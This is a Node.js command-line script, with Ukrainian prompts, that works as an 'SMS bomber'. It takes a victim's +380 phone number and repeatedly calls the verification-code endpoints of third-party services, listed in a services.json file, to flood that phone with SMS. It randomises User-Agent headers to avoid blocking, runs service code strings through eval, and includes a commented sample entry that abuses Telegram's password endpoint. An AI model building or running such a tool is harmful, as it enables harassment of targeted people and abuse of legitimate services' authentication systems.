// noinspection JSUnresolvedVariable
// noinspection JSCheckFunctionSignatures

import Axios from 'axios'
import UserAgent from 'user-agents'
import Chalk from 'chalk'

import Process from 'node:child_process'
import ReadLine from 'node:readline'
import FS from 'node:fs'

const user_argent = new UserAgent().toString()

const headers = {
    'User-Agent': user_argent,
    'Content-Type': 'application/json'
};

(async () => {
    Process.exec('clear')

    // Не змінювати назву змінної.
    const number = await ask(Chalk.magentaBright('Введіть номер телефону: ') + '+380')
    const delay_between = await ask(Chalk.magentaBright('Затримка між СМС (у секундах): '))

    const services_str = await readFile('./services.json')
    const json = JSON.parse(services_str)

    const keys = Object.keys(json)

    for (let i = 0; i < keys.length; i++) {
        const target_name = keys[i]
        const target_api = json[target_name]

        setTimeout(() => {
            // noinspection ES6MissingAwait
            sendRepeatableRequest(async () => {
                try {
                    const res = await eval(target_api.function.code.replaceAll('%phone-number%', number))
                    const response = JSON.stringify(res.data)

                    const expected_response = new RegExp(target_api.expected_response.body)
                    const success = expected_response.test(response)

                    const output = wrapText(
                        (success ? 'green' : 'red'),
                        (res.status + ', ' + target_name)
                    )

                    console.log(output)
                } catch (error) {
                    if (Axios.isAxiosError(error)) {
                        const output = wrapText(('red'), (error.status + ', ' + target_name))
                        const status_text = wrapText(('red'), ('└─ ' + error.response.statusText))

                        console.log(output)
                        console.log(status_text)
                    }
                }
            }, target_api.cooldown)
        }, i * (delay_between * 1000))
    }
})()

async function sendRepeatableRequest (runnable, cooldown) {
    await runnable()

    setInterval(async () => {
        await runnable()
    }, (cooldown + 5_000))
}

function readFile (path) {
    return new Promise((resolve, reject) => {
        FS.readFile(path, 'utf8', (error, data) => {
            if (error) {
                reject(error)
                return
            }

            resolve(data)
        })
    })
}

function ask (question) {
    const io = ReadLine.createInterface({
        input: process.stdin,
        output: process.stdout
    })

    return new Promise((resolve) => io.question(wrapText('purple', question), (answer) => {
        io.close()
        resolve(answer)
    }))
}

function wrapText (quad_color, text) {
    switch (quad_color) {
        case 'purple':
            return Chalk.bgMagentaBright('  ') + ' ' + text
        case 'green':
            return Chalk.bgGreenBright('  ') + ' ' + text
        case 'red':
            return Chalk.bgRedBright('  ') + ' ' + text

        default: {
            return Chalk.bgWhite('  ') + ' ' + text
        }
    }
}

function convertFunctionToString (function_) {
    return '(' + function_.toString() + ')()'
}

/*
  "telegram.org": {
    "cooldown": 180000,

    "function": {
      "code": "(async function sendRequest() { return await Axios.post('https://my.telegram.org/auth/send_password', new URLSearchParams({ phone: '+380' + '%phone-number%' }), { headers }) })()"
    },

    "expected_response": {
      "body": "?"
    }
  },
 */